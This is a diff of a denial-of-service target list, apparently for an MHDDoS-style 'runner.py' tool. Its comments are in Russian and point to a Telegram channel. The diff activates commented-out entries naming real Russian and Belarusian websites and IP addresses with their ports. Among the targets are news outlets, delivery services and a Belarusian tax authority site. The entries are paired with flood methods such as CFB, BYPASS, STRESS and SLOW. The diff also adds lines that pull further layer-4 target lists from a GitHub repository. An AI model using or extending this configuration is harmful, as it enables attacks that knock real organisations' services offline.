@@ -3,18 +3,18 @@
 ### Правило не железное, но в основном раскоментированы только 1-3 последние цели, анонсируемые в канале Украинский Жнец - https://t.me/+-GoGtA_IsOk3YmE6
 
 ### rusvesna.su https://t.me/c/1624648668/87
-#runner.py http://rusvesna.su/ http://m.rusvesna.su/ --http-methods CFB CFBUAM
+runner.py http://rusvesna.su/ http://m.rusvesna.su/ --http-methods CFB CFBUAM
 
 # https://carte.by/vitebsk/dostavka/
-#https://carte.by/source/front/api.js https://carte.by/minsk/hpl/export/ https://carte.by/vitebsk/dostavka/ 193.176.182.165:80 193.176.182.165:443 tcp://193.176.182.165:80 tcp://193.176.182.165:443  --http-methods BYPASS GET STRESS
+https://carte.by/source/front/api.js https://carte.by/minsk/hpl/export/ https://carte.by/vitebsk/dostavka/ 193.176.182.165:80 193.176.182.165:443 tcp://193.176.182.165:80 tcp://193.176.182.165:443  --http-methods BYPASS GET STRESS
 
 ### smotrim.ru https://t.me/c/1624648668/85
-#runner.py tcp://80.249.129.244:443 tcp://80.249.129.244:80  --http-methods TCP FLOOD
+tcp://80.249.129.244:443 tcp://80.249.129.244:80
 
 ###Везёт всем - онлайн-сервис по грузоперевозкам.
-#https://vezetvsem.ru/ https://frontend.vezetvsem.ru/ 89.108.106.50:80 89.108.106.50:443 https://89.108.106.50:443 tcp://89.108.106.50:22 tcp://89.108.106.50:80 tcp://89.108.106.50:443  --http-methods CFB CFBUAM
+https://vezetvsem.ru/ https://frontend.vezetvsem.ru/ 89.108.106.50:80 89.108.106.50:443 https://89.108.106.50:443 tcp://89.108.106.50:22 tcp://89.108.106.50:80 tcp://89.108.106.50:443  --http-methods CFB CFBUAM
 
-#http://pogoda-sv.ru/monitoring/weather_forecast/  http://pogoda-sv.ru/  https://pogoda-sv.ru/monitoring/weather_forecast/ 62.213.11.115:80 https://62.213.11.115:443 tcp://62.213.11.115:80 tcp://62.213.11.115:443 tcp://62.213.11.115:1122 tcp://62.213.11.115:1123 --http-methods STRESS GET HEAD EVEN
+http://pogoda-sv.ru/monitoring/weather_forecast/  http://pogoda-sv.ru/  https://pogoda-sv.ru/monitoring/weather_forecast/ 62.213.11.115:80 https://62.213.11.115:443 tcp://62.213.11.115:80 tcp://62.213.11.115:443 tcp://62.213.11.115:1122 tcp://62.213.11.115:1123 --http-methods STRESS GET HEAD EVEN
 
 https://boxberry.ru/ https://argumenti.ru/ tcp://5.189.239.12:8888 tcp://5.189.239.12:9090 tcp://109.234.158.163:8181 tcp://109.234.158.166:8181 tcp://5.189.239.12:5000 tcp://5.189.239.12:8181 tcp://130.193.37.150:80 tcp://130.193.37.150:443 tcp://178.154.196.210:22 tcp://178.154.196.210:80 tcp://178.154.196.210:443 tcp://37.18.29.167:80 tcp://37.18.29.167:443 tcp://130.193.36.55:80 tcp://130.193.36.55:443 --http-methods STRESS
 
@@ -43,6 +43,16 @@ https://meteoinfo.ru http://meteoinfo.ru https://meteoinfo.ru/novosti http://193
 https://www.5-tv.ru http://www.5-tv.ru https://www.5-tv.ru/schedule/ http://ctv.by http://ctv.by/tv-programm-voskr https://www.sb.by https://www.sb.by/articles/themes/situatsiya-vokrug-dnr-i-lnr/  https://ekdostavka.ru http://ekdostavka.ru --http-methods DOWNLOADER BYPASS SLOW
 
 http://nalog.gov.by 195.50.4.54:80 195.50.4.54:443 tcp://195.50.4.54:80 tcp://195.50.4.54:443 --http-methods STRESS GET
+
+-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer4_443.lst
+
+-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer4_80.lst 
+
+-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer4_2000.lst
+
+-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer4_5060.lst
+
+-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer4_other.lst
 
 #https://ekdostavka.ru http://ekdostavka.ru 82.202.172.28:80 82.202.172.28:443 https://82.202.172.28:443 tcp://82.202.172.28:21 tcp://82.202.172.28:22 tcp://82.202.172.28:80 tcp://82.202.172.28:443 tcp://82.202.172.28:587 tcp://82.202.172.28:110 --http-methods BYPASS CFB STRESS
 
